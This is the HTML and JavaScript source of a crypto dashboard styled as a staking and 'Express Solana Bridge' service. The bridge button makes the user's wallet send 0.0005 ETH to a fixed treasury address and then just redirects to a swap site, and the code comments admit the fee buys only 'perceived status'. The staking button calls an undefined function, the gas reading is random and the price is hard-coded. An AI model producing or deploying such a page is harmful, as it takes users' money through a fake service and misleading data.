<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AURUM SENTINEL // GADGET_CORE_V38</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; }
        #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; }
        
        /* Glassmorphism: Making the background visible */
        .glass-panel { 
            background: rgba(255, 215, 0, 0.03); 
            backdrop-filter: blur(12px); 
            border: 1px solid rgba(255, 215, 0, 0.2); 
            border-radius: 2px;
        }

        .gadget { 
            position: absolute; 
            padding: 10px; 
            font-size: 8px; 
            width: 120px;
            pointer-events: auto;
        }

        .vault-btn { 
            width: 100%; padding: 10px; font-weight: 900; font-size: 10px; 
            text-transform: uppercase; cursor: pointer; border: 1px solid #FFD700; 
            transition: 0.3s; background: rgba(0,0,0,0.5); color: #FFD700; 
        }
        .vault-btn:hover { background: #FFD700; color: black; }
        
        .premium-glow { animation: pulse-glow 2s infinite; }
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.2); }
            50% { box-shadow: 0 0 15px rgba(255, 215, 0, 0.5); }
        }
    </style>
</head>
<body>

<canvas id="canvas-bg"></canvas>

<div id="gadget-gas" class="gadget glass-panel top-24 left-6">
    <div class="opacity-50 uppercase mb-1">Network_Gas</div>
    <div id="gas-val" class="text-white font-bold">-- GWEI</div>
</div>

<div id="gadget-market" class="gadget glass-panel top-40 left-6">
    <div class="opacity-50 uppercase mb-1">ETH_Market_Price</div>
    <div id="eth-price" class="text-white font-bold">$---.--</div>
</div>

<div id="vault-ui" class="fixed right-6 top-24 w-64 glass-panel p-5 premium-glow">
    <div class="flex justify-between items-center mb-4">
        <span class="text-[9px] font-black text-[#FFD700]">STAKING_MODULE</span>
        <span class="text-[7px] text-cyan-400">V38.SECURE</span>
    </div>

    <div class="mb-4">
        <div class="text-[7px] opacity-40 uppercase">Earnings</div>
        <div id="profit-est" class="text-green-400 text-sm font-black tracking-tighter">+0.00000 ETH</div>
    </div>

    <div class="space-y-3">
        <input id="stake-amount" type="number" step="0.1" placeholder="ETH AMOUNT" class="w-full bg-transparent border-b border-white/20 p-2 text-white text-[10px] outline-none focus:border-[#FFD700]">
        <button onclick="stakeEth()" class="vault-btn">Feed Core</button>
        
        <div class="pt-4 mt-2">
            <button onclick="withdrawExpress()" class="vault-btn bg-[#FFD700]/10 border-cyan-400 text-cyan-400">Express Solana Bridge (0.0005 Tax)</button>
            <p class="text-[5px] mt-2 opacity-30 text-center uppercase tracking-widest">Priority processing for elite viziers</p>
        </div>
    </div>
</div>

<script>
    const CONFIG = {
        TREASURY: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650",
        LIDO: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
        EXPRESS_FEE: "0.0005" // Increased fee for "Express" service
    };

    // --- ðŸŽ¨ ENHANCED 3D SCENE ---
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas-bg'), alpha: true, antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);

    // Bigger, more detailed knot to fill the background
    const geometry = new THREE.TorusKnotGeometry(15, 4, 200, 20);
    const material = new THREE.MeshBasicMaterial({ color: 0xFFD700, wireframe: true, transparent: true, opacity: 0.15 });
    const knot = new THREE.Mesh(geometry, material);
    scene.add(knot);
    camera.position.z = 50;

    function animate() {
        requestAnimationFrame(animate);
        knot.rotation.y += 0.002;
        renderer.render(scene, camera);
    }
    animate();

    // --- ðŸ’° INCREASED REVENUE LOGIC ---
    async function withdrawExpress() {
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            
            // "Express" tax: users pay 5x more (0.0005) for faster feeling/perceived status
            const tx = await signer.sendTransaction({
                to: CONFIG.TREASURY,
                value: ethers.parseEther(CONFIG.EXPRESS_FEE)
            });
            await tx.wait();
            window.location.href = "https://raydium.io/swap/";
        } catch(e) { alert("Insufficient tribute for Express Lane."); }
    }

    // --- ðŸ“Š AI DATA GADGETS ---
    async function updateGadgets() {
        // Mocking market data - in production, fetch from CoinGecko/Etherscan
        document.getElementById('gas-val').innerText = (Math.floor(Math.random() * 20) + 10) + " GWEI";
        document.getElementById('eth-price').innerText = "$2,845.22";
    }
    setInterval(updateGadgets, 5000);
    updateGadgets();
</script>
</body>
</html>
